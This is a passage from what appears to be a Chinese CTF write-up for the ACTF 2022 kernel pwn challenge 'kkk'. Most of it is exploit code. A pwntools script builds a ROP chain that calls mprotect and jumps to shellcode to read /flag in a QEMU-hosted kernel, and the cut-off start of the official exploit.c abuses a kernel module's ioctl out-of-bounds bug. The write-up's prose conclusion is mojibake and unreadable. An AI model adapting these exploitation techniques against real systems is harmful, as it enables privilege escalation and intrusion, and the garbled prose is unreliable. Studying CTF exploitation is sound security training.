</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python">
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">base64</span>

<span class="n">sys</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39;/home/x1do0/.local/lib/python3.8/site-packages&#39;</span><span class="p">)</span>
<span class="n">sys</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39;/home/x1do0/.local/lib/python3.8/site-packages/unicornafl-1.0.3-py3.8.egg&#39;</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>


<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">endian</span> <span class="o">=</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span> <span class="s1">&#39;splitw&#39;</span><span class="p">,</span> <span class="s1">&#39;-h&#39;</span><span class="p">,</span> <span class="s1">&#39;-p&#39;</span><span class="p">,</span> <span class="s1">&#39;75&#39;</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">SEND</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">con</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">con</span><span class="p">))</span>


<span class="c1"># io = process(&#34;./parser&#34;)</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&#34;qemu-system-x86_64&#34;</span><span class="p">,</span> <span class="s2">&#34;-m&#34;</span><span class="p">,</span> <span class="s2">&#34;1024M&#34;</span><span class="p">,</span> <span class="s2">&#34;-kernel&#34;</span><span class="p">,</span> <span class="s2">&#34;bzImage&#34;</span><span class="p">,</span> <span class="s2">&#34;-initrd&#34;</span><span class="p">,</span> <span class="s2">&#34;rootfs.img&#34;</span><span class="p">,</span> <span class="s2">&#34;-monitor&#34;</span><span class="p">,</span> <span class="s2">&#34;/dev/null&#34;</span><span class="p">,</span> <span class="s2">&#34;-append&#34;</span><span class="p">,</span> <span class="s2">&#34;root=/dev/ram console=ttyS0 oops=panic panic=1 kpti=1 quiet&#34;</span><span class="p">,</span> <span class="s2">&#34;-cpu&#34;</span><span class="p">,</span> <span class="s2">&#34;kvm64,+smep,+smap&#34;</span><span class="p">,</span> <span class="s2">&#34;-smp&#34;</span><span class="p">,</span> <span class="s2">&#34;cores=2,threads=2&#34;</span><span class="p">,</span> <span class="s2">&#34;-nographic&#34;</span><span class="p">,</span> <span class="s2">&#34;-enable-kvm&#34;</span><span class="p">])</span>

<span class="c1"># input()</span>
<span class="c1"># gdb.attach(io, &#34;b *0x401B22&#34;)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">15</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;ENTER YOUR PACKET &gt; &#34;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;ENTER YOUR PACKET &gt; &#34;</span><span class="p">)</span>

<span class="c1">### pakcet_hdr 0 - 0x30</span>

<span class="n">packet_hdr</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xAAA</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">packet_hdr</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">packet_hdr</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x877</span><span class="p">)</span> <span class="c1"># a1[4]</span>
<span class="n">packet_hdr</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x796f15c9</span><span class="p">)</span> <span class="c1"># crc32</span>
<span class="n">packet_hdr</span> <span class="o">=</span> <span class="n">packet_hdr</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x30</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>


<span class="n">SEND</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">packet_hdr</span><span class="p">)</span>

<span class="c1">### segment_hdr 0x30 - 0x38</span>

<span class="n">cnt</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">segment_hdr</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">cnt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># a1[:30]</span>

<span class="n">SEND</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">segment_hdr</span><span class="p">)</span>

<span class="c1">### segment 0x38 - </span>


<span class="c1">### header 8 bytes</span>
<span class="n">size</span> <span class="o">=</span> <span class="mh">0xf0000000</span>
<span class="n">segment</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
<span class="n">SEND</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">segment</span><span class="p">)</span> 

<span class="c1">### content size bytes</span>

<span class="c1"># 0x00000000004006a6 : pop rdi ; ret</span>
<span class="c1"># 0x000000000045c139 : pop rdx ; pop rsi ; ret</span>
<span class="c1"># 0x00000000004005af : pop rax ; ret</span>
<span class="c1"># 0x00000000004859c5 : syscall ; ret</span>


<span class="c1"># mprotect(buf, 0x1000, 4|2|1)</span>

<span class="n">buf_addr</span> <span class="o">=</span> <span class="mh">0x6D4000</span>

<span class="n">rop</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="mh">0x00000000004006a6</span><span class="p">,</span> <span class="n">buf_addr</span><span class="p">,</span>
        <span class="mh">0x000000000045c139</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span>
        <span class="mh">0x00000000004005af</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span>
        <span class="mh">0x00000000004859c5</span><span class="p">)</span>

<span class="c1"># read(0, buf, 0x100)</span>

<span class="c1"># rop += flat(0x00000000004006a6, 0,</span>
<span class="c1">#         0x000000000045c139, 0x100, buf_addr,</span>
<span class="c1">#         0x00000000004005af, 0,</span>
<span class="c1">#         0x00000000004859c5)</span>


<span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&#34;/flag&#34;</span><span class="p">))</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="s1">&#39;rax&#39;</span><span class="p">,</span> <span class="n">buf_addr</span><span class="o">+</span><span class="mh">0x200</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">))</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf_addr</span><span class="o">+</span><span class="mh">0x200</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">))</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;exp.o&#34;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

<span class="n">rop</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">(</span><span class="mh">0x00000000004006a6</span><span class="p">,</span> <span class="n">buf_addr</span><span class="p">,</span>
        <span class="mh">0x402a3c</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> 
        <span class="mh">0x401ABB</span><span class="p">)</span>


<span class="c1"># ret2shellcode</span>

<span class="n">rop</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span>

<span class="n">content</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x848</span> <span class="o">+</span> <span class="n">rop</span>
<span class="n">SEND</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">()</span>

<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>

<span class="c1"># 0x7ffdbdb52b80</span>
<span class="c1"># return at 0x7ffdbdb533c8</span>


<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="conclusion">Conclusion</h2>
<p>è‡³æ­¤ï¼Œè¿™é¢˜å°±ç®—æ˜¯åšå®Œäº†ã€‚æœ€ç»ˆçš„è„šæœ¬æˆåŠŸæ¦‚ç‡ä¸æ˜¯ç‰¹åˆ«é«˜ï¼Œä½†å¦‚æœç”¨æˆ·æ€ ROP æ—¶åŠ å‡ ä¸ª ret slide çš„è¯æ¦‚ç‡èƒ½æ˜¾è‘—æé«˜ï¼ˆå¯èƒ½æ˜¯é”™è§‰&hellip;ï¼‰ã€‚ä¸€å¼€å§‹è„¸æ¯”è¾ƒé»‘æ€»æ˜¯æ‰“ä¸é€šï¼Œè¿˜ä»¥ä¸º host å’Œ guest åç§»ä¸ä¸€æ ·&hellip;ä½†è¿™æ˜¯é™æ€ç¼–è¯‘å•Šï¼Œå½“æ—¶å°±è§‰å¾—å¾ˆè¿·ã€‚ä¸è¿‡æœ€åèƒ½ç¡®è®¤çš„ä¸€ç‚¹å°±æ˜¯ï¼šhost ä¸ guest åç§»æ²¡åŒºåˆ«ã€‚è™½ç„¶ Nu1L é‚£è¾¹çš„å¸ˆå‚…ä¹Ÿè§‰å¾—ç—›è‹¦ï¼Œä½†æˆ‘æƒ³æˆ‘çš„ç—›è‹¦å®Œå…¨æºäºè‡ªå·±å¤ªå¼±ã€‚ã€‚ï¼ˆè„¸é»‘ä¹Ÿæ˜¯å¼±çš„ä¸€ä¸ªè¡¨ç° :/</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://s2.loli.net/2022/07/17/T6C3GoAZ1itfaHe.png"
        data-srcset="https://s2.loli.net/2022/07/17/T6C3GoAZ1itfaHe.png, https://s2.loli.net/2022/07/17/T6C3GoAZ1itfaHe.png 1.5x, https://s2.loli.net/2022/07/17/T6C3GoAZ1itfaHe.png 2x"
        data-sizes="auto"
        alt="https://s2.loli.net/2022/07/17/T6C3GoAZ1itfaHe.png"
        title="https://s2.loli.net/2022/07/17/T6C3GoAZ1itfaHe.png" /></p>
<p>æœ€åå†è´´ä¸€ä¸‹å‡ºé¢˜äººå¤§å“¥å¿˜è®°ä¼ ä¸Š<a href="https://github.com/team-s2/ACTF-2022/tree/main/pwn/kkk/exploits" target="_blank" rel="noopener noreffer">å®˜æ–¹é¢˜è§£</a>çš„ exploit.c</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span><span class="lnt">249
</span><span class="lnt">250
</span><span class="lnt">251
</span><span class="lnt">252
</span><span class="lnt">253
</span><span class="lnt">254
</span><span class="lnt">255
</span><span class="lnt">256
</span><span class="lnt">257
</span><span class="lnt">258
</span><span class="lnt">259
</span><span class="lnt">260
</span><span class="lnt">261
</span><span class="lnt">262
</span><span class="lnt">263
</span><span class="lnt">264
</span><span class="lnt">265
</span><span class="lnt">266
</span><span class="lnt">267
</span><span class="lnt">268
</span><span class="lnt">269
</span><span class="lnt">270
</span><span class="lnt">271
</span><span class="lnt">272
</span><span class="lnt">273
</span><span class="lnt">274
</span><span class="lnt">275
</span><span class="lnt">276
</span><span class="lnt">277
</span><span class="lnt">278
</span><span class="lnt">279
</span><span class="lnt">280
</span><span class="lnt">281
</span><span class="lnt">282
</span><span class="lnt">283
</span><span class="lnt">284
</span><span class="lnt">285
</span><span class="lnt">286
</span><span class="lnt">287
</span><span class="lnt">288
</span><span class="lnt">289
</span><span class="lnt">290
</span><span class="lnt">291
</span><span class="lnt">292
</span><span class="lnt">293
</span><span class="lnt">294
</span><span class="lnt">295
</span><span class="lnt">296
</span><span class="lnt">297
</span><span class="lnt">298
</span><span class="lnt">299
</span><span class="lnt">300
</span><span class="lnt">301
</span><span class="lnt">302
</span><span class="lnt">303
</span><span class="lnt">304
</span><span class="lnt">305
</span><span class="lnt">306
</span><span class="lnt">307
</span><span class="lnt">308
</span><span class="lnt">309
</span><span class="lnt">310
</span><span class="lnt">311
</span><span class="lnt">312
</span><span class="lnt">313
</span><span class="lnt">314
</span><span class="lnt">315
</span><span class="lnt">316
</span><span class="lnt">317
</span><span class="lnt">318
</span><span class="lnt">319
</span><span class="lnt">320
</span><span class="lnt">321
</span><span class="lnt">322
</span><span class="lnt">323
</span><span class="lnt">324
</span><span class="lnt">325
</span><span class="lnt">326
</span><span class="lnt">327
</span><span class="lnt">328
</span><span class="lnt">329
</span><span class="lnt">330
</span><span class="lnt">331
</span><span class="lnt">332
</span><span class="lnt">333
</span><span class="lnt">334
</span><span class="lnt">335
</span><span class="lnt">336
</span><span class="lnt">337
</span><span class="lnt">338
</span><span class="lnt">339
</span><span class="lnt">340
</span><span class="lnt">341
</span><span class="lnt">342
</span><span class="lnt">343
</span><span class="lnt">344
</span><span class="lnt">345
</span><span class="lnt">346
</span><span class="lnt">347
</span><span class="lnt">348
</span><span class="lnt">349
</span><span class="lnt">350
</span><span class="lnt">351
</span><span class="lnt">352
</span><span class="lnt">353
</span><span class="lnt">354
</span><span class="lnt">355
</span><span class="lnt">356
</span><span class="lnt">357
</span><span class="lnt">358
</span><span class="lnt">359
</span><span class="lnt">360
</span><span class="lnt">361
</span><span class="lnt">362
</span><span class="lnt">363
</span><span class="lnt">364
</span><span class="lnt">365
</span><span class="lnt">366
</span><span class="lnt">367
</span><span class="lnt">368
</span><span class="lnt">369
</span><span class="lnt">370
</span><span class="lnt">371
</span><span class="lnt">372
</span><span class="lnt">373
</span><span class="lnt">374
</span><span class="lnt">375
</span><span class="lnt">376
</span><span class="lnt">377
</span><span class="lnt">378
</span><span class="lnt">379
</span><span class="lnt">380
</span><span class="lnt">381
</span><span class="lnt">382
</span><span class="lnt">383
</span><span class="lnt">384
</span><span class="lnt">385
</span><span class="lnt">386
</span><span class="lnt">387
</span><span class="lnt">388
</span><span class="lnt">389
</span><span class="lnt">390
</span><span class="lnt">391
</span><span class="lnt">392
</span><span class="lnt">393
</span><span class="lnt">394
</span><span class="lnt">395
</span><span class="lnt">396
</span><span class="lnt">397
</span><span class="lnt">398
</span><span class="lnt">399
</span><span class="lnt">400
</span><span class="lnt">401
</span><span class="lnt">402
</span><span class="lnt">403
</span><span class="lnt">404
</span><span class="lnt">405
</span><span class="lnt">406
</span><span class="lnt">407
</span><span class="lnt">408
</span><span class="lnt">409
</span><span class="lnt">410
</span><span class="lnt">411
</span><span class="lnt">412
</span><span class="lnt">413
</span><span class="lnt">414
</span><span class="lnt">415
</span><span class="lnt">416
</span><span class="lnt">417
</span><span class="lnt">418
</span><span class="lnt">419
</span><span class="lnt">420
</span><span class="lnt">421
</span><span class="lnt">422
</span><span class="lnt">423
</span><span class="lnt">424
</span><span class="lnt">425
</span><span class="lnt">426
</span><span class="lnt">427
</span><span class="lnt">428
</span><span class="lnt">429
</span><span class="lnt">430
</span><span class="lnt">431
</span><span class="lnt">432
</span><span class="lnt">433
</span><span class="lnt">434
</span><span class="lnt">435
</span><span class="lnt">436
</span><span class="lnt">437
</span><span class="lnt">438
</span><span class="lnt">439
</span><span class="lnt">440
</span><span class="lnt">441
</span><span class="lnt">442
</span><span class="lnt">443
</span><span class="lnt">444
</span><span class="lnt">445
</span><span class="lnt">446
</span><span class="lnt">447
</span><span class="lnt">448
</span><span class="lnt">449
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// this POC demonstrates the oob ability
</span><span class="c1"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="cm">/* ioctl commands */</span>
<span class="cp">#define KKK_IOCTL_ADD _IO(&#39;k&#39;, 100)
</span><span class="cp">#define KKK_IOCTL_UPDATE _IO(&#39;k&#39;, 103)
</span><span class="cp">#define KKK_IOCTL_DUMP _IO(&#39;k&#39;, 105)
</span><span class="cp">#define KKK_IOCTL_LAUNCH _IO(&#39;k&#39;, 107)
</span><span class="cp">#define KKK_IOCTL_DETACH _IO(&#39;k&#39;, 109)
</span><span class="cp"></span>
<span class="cp">#define MAX_OBJECT_NUM (16)
</span><span class="cp"></span>
<span class="k">enum</span> <span class="n">kkk_type</span>
<span class="p">{</span>
    <span class="n">KKK_CRYPTO_DES</span><span class="p">,</span>
    <span class="n">KKK_CRYPTO_3DES</span><span class="p">,</span>
    <span class="n">KKK_CRYPTO_AES128</span><span class="p">,</span>
    <span class="n">KKK_CRYPTO_AES256</span><span class="p">,</span>
    <span class="n">KKK_CRYPTO_NUM</span>
<span class="p">};</span>

<span class="cm">/* core data strcutres */</span>
<span class="k">struct</span> <span class="n">kkk_pack</span>
<span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span><span class="p">;</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span><span class="p">;</span> <span class="c1">// user space pointer
</span><span class="c1"></span><span class="p">};</span>

<span class="k">struct</span> <span class="n">kkk_obj</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">kkk_pack</span> <span class="n">keypack</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">kkk_pack</span> <span class="n">datapack</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">id</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">enc</span><span class="p">;</span>
    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">handler</span><span class="p">)(</span><span class="k">struct</span> <span class="n">kkk_obj</span> <span class="o">*</span><span class="p">);</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="n">kkk_ioctl_add_arg</span>
<span class="p">{</span>
    <span class="k">enum</span> <span class="n">kkk_type</span> <span class="n">type</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">enc</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">kkk_pack</span> <span class="n">key</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">kkk_pack</span> <span class="n">data</span><span class="p">;</span>
<span class="p">};</span>

<span class="c1">// we are sorry to introduce this structure
</span><span class="c1">// only now we can use one indirect call to pivot the stack to heap
</span><span class="c1"></span><span class="k">struct</span> <span class="n">kkk_ioctl_other_arg</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">id</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">kkk_pack</span> <span class="n">key</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">kkk_pack</span> <span class="n">data</span><span class="p">;</span>
<span class="p">};</span>

<span class="kt">void</span> <span class="nf">privileged_function</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">uid</span> <span class="o">=</span> <span class="n">getuid</span><span class="p">();</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;uid: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/flag&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">128</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
<span class="p">}</span>

